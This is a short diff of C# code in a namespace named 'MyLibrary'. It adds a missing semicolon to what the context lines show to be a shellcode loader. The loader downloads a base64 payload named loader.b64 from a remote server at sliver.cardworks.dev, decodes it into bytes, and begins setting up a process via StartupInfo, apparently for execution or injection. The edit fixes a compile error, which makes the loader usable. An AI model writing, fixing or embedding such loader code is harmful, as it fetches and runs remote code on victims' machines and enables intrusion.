@@ -137,7 +137,7 @@ namespace MyLibrary
                 string url = "http://sliver.cardworks.dev:8000/loader.b64";
                 string scString = client.DownloadString(url);
                 
-                byte[] sc = System.Convert.FromBase64String(scString)
+                byte[] sc = System.Convert.FromBase64String(scString);
 
                 Int32 size = sc.Length;
                 StartupInfo sInfo = new StartupInfo();
